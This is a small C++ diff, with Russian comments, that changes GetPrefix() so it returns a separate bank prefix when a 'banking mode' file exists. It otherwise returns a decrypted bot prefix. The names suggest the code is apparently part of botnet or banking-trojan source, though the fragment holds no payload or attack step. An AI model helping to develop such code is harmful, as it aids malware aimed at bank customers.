@@ -178,17 +178,18 @@ bool IsBankingMode()
 	string FileName = GetBankingModeFileName();
 	return !FileName.IsEmpty() && FileExistsA(FileName.t_str());
 }
+
 //-----------------------------------------------------------------------------
 
 
-char *GetPrefix()
+char *GetPrefix(bool CheckBankingMode)
 {
 	// Функция возвращает префикс бота
 
 		// Проверяем режим режим работы
 
-//	if (IsBankingMode())
-//		return BOT_PREFIX_BANK;
+	if (CheckBankingMode && IsBankingMode())
+		return BOT_PREFIX_BANK;
 
 	if (BOTPARAM_ENCRYPTED_PREFIX)
 		return Decrypt(BOT_PREFIX);
